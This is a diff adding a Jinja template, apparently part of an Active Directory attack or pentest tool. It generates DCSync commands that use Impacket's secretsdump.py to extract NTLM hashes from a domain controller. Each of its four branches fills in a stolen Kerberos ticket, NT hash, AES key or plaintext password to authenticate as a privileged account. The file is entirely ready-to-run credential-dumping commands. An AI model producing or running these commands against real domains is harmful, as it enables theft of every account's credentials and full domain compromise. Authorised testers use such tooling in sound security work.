@@ -1,0 +1,10 @@
+# DCSync {{target.name}}
+{% if parent.krb_auth %}
+secretsdump.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -k -no-pass -target-ip {{dc_ip}} -dc-ip {{dc_ip}} -just-dc-ntlm
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+secretsdump.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -hashes :{{parent.secret|red}} -target-ip {{dc_ip}} -dc-ip {{dc_ip}} -just-dc-ntlm
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+secretsdump.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -k -no-pass -aesKey {{parent.secret|red}} -target-ip {{dc_ip}} -dc-ip {{dc_ip}} -just-dc-ntlm
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+secretsdump.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{dc_name}}' -target-ip {{dc_ip}} -dc-ip {{dc_ip}} -just-dc-ntlm
+{%- endif %}
